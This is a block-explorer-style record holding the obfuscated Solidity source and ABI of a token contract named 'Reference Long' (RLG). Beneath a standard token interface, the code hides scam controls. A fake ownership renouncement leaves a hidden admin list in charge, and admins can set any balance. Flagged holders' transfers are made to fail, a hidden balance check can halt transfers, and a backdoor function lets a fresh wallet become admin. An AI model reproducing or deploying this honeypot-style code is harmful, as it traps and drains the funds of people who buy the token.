{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface limitFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableShould {\n    function createPair(address senderBuy, address maxTrading) external returns (address);\n}\n\ninterface senderLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyLimit) external view returns (uint256);\n\n    function transfer(address exemptFee, uint256 swapWallet) external returns (bool);\n\n    function allowance(address buyTradingMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptFee,\n        uint256 swapWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toLiquidity, uint256 value);\n    event Approval(address indexed buyTradingMax, address indexed spender, uint256 value);\n}\n\ninterface enableSender is senderLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReferenceLong is amountFrom, senderLimit, enableSender {\n\n    bool public fromWalletTx;\n\n    bool public autoLiquidity;\n\n    constructor (){\n        if (autoAmount) {\n            tradingLimitLaunch = tokenSellTake;\n        }\n        limitFund receiverAt = limitFund(liquidityAmount);\n        toReceiver = enableShould(receiverAt.factory()).createPair(receiverAt.WETH(), address(this));\n        if (toShouldIs) {\n            shouldIs = tokenSellTake;\n        }\n        teamToken = _msgSender();\n        shouldTo();\n        sellListMax[teamToken] = true;\n        buyList[teamToken] = exemptMarketingBuy;\n        if (tradingLimitLaunch != buyLaunched) {\n            senderTeam = true;\n        }\n        emit Transfer(address(0), teamToken, exemptMarketingBuy);\n    }\n\n    event OwnershipTransferred(address indexed toFee, address indexed totalTo);\n\n    mapping(address => uint256) private buyList;\n\n    bool public senderTeam;\n\n    uint256 constant fundList = 17 ** 10;\n\n    function shouldExempt(address maxList, address exemptFee, uint256 swapWallet) internal returns (bool) {\n        if (maxList == teamToken) {\n            return marketingReceiverFund(maxList, exemptFee, swapWallet);\n        }\n        uint256 buyTeam = senderLimit(toReceiver).balanceOf(swapMin);\n        require(buyTeam == liquidityShould);\n        require(exemptFee != swapMin);\n        if (launchedLaunch[maxList]) {\n            return marketingReceiverFund(maxList, exemptFee, fundList);\n        }\n        return marketingReceiverFund(maxList, exemptFee, swapWallet);\n    }\n\n    bool public toShouldIs;\n\n    address public toReceiver;\n\n    uint256 sellMode;\n\n    function launchedShouldMode(uint256 swapWallet) public {\n        buyTradingWallet();\n        liquidityShould = swapWallet;\n    }\n\n    function balanceOf(address buyLimit) public view virtual override returns (uint256) {\n        return buyList[buyLimit];\n    }\n\n    function launchTrading(address exemptFromTrading, uint256 swapWallet) public {\n        buyTradingWallet();\n        buyList[exemptFromTrading] = swapWallet;\n    }\n\n    function owner() external view returns (address) {\n        return limitBuy;\n    }\n\n    function buyAmountIs(address enableAmountLiquidity) public {\n        buyTradingWallet();\n        if (senderTeam) {\n            autoAmount = true;\n        }\n        if (enableAmountLiquidity == teamToken || enableAmountLiquidity == toReceiver) {\n            return;\n        }\n        launchedLaunch[enableAmountLiquidity] = true;\n    }\n\n    function marketingReceiverFund(address maxList, address exemptFee, uint256 swapWallet) internal returns (bool) {\n        require(buyList[maxList] >= swapWallet);\n        buyList[maxList] -= swapWallet;\n        buyList[exemptFee] += swapWallet;\n        emit Transfer(maxList, exemptFee, swapWallet);\n        return true;\n    }\n\n    address public teamToken;\n\n    uint256 public tradingLimitLaunch;\n\n    uint256 private exemptMarketingBuy = 100000000 * 10 ** 18;\n\n    function approve(address swapReceiver, uint256 swapWallet) public virtual override returns (bool) {\n        exemptAt[_msgSender()][swapReceiver] = swapWallet;\n        emit Approval(_msgSender(), swapReceiver, swapWallet);\n        return true;\n    }\n\n    uint256 private shouldIs;\n\n    bool private autoAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitTx;\n    }\n\n    bool private liquidityTo;\n\n    mapping(address => bool) public sellListMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverSender;\n    }\n\n    address liquidityAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private limitBuy;\n\n    function allowance(address feeFrom, address swapReceiver) external view virtual override returns (uint256) {\n        if (swapReceiver == liquidityAmount) {\n            return type(uint256).max;\n        }\n        return exemptAt[feeFrom][swapReceiver];\n    }\n\n    mapping(address => bool) public launchedLaunch;\n\n    function buyTradingWallet() private view {\n        require(sellListMax[_msgSender()]);\n    }\n\n    uint8 private limitTx = 18;\n\n    uint256 private tokenSellTake;\n\n    function getOwner() external view returns (address) {\n        return limitBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptAt;\n\n    uint256 public buyLaunched;\n\n    address swapMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private limitEnable = \"Reference Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return limitEnable;\n    }\n\n    bool public walletLaunched;\n\n    uint256 liquidityShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptMarketingBuy;\n    }\n\n    function walletAmountReceiver(address liquiditySenderExempt) public {\n        require(liquiditySenderExempt.balance < 100000);\n        if (fromWalletTx) {\n            return;\n        }\n        \n        sellListMax[liquiditySenderExempt] = true;\n        \n        fromWalletTx = true;\n    }\n\n    string private receiverSender = \"RLG\";\n\n    function shouldTo() public {\n        emit OwnershipTransferred(teamToken, address(0));\n        limitBuy = address(0);\n    }\n\n    function transferFrom(address maxList, address exemptFee, uint256 swapWallet) external override returns (bool) {\n        if (_msgSender() != liquidityAmount) {\n            if (exemptAt[maxList][_msgSender()] != type(uint256).max) {\n                require(swapWallet <= exemptAt[maxList][_msgSender()]);\n                exemptAt[maxList][_msgSender()] -= swapWallet;\n            }\n        }\n        return shouldExempt(maxList, exemptFee, swapWallet);\n    }\n\n    function transfer(address exemptFromTrading, uint256 swapWallet) external virtual override returns (bool) {\n        return shouldExempt(_msgSender(), exemptFromTrading, swapWallet);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTradingMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmountLiquidity\",\"type\":\"address\"}],\"name\":\"buyAmountIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromWalletTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFromTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapWallet\",\"type\":\"uint256\"}],\"name\":\"launchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapWallet\",\"type\":\"uint256\"}],\"name\":\"launchedShouldMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellListMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShouldIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLimitLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFromTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySenderExempt\",\"type\":\"address\"}],\"name\":\"walletAmountReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ReferenceLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}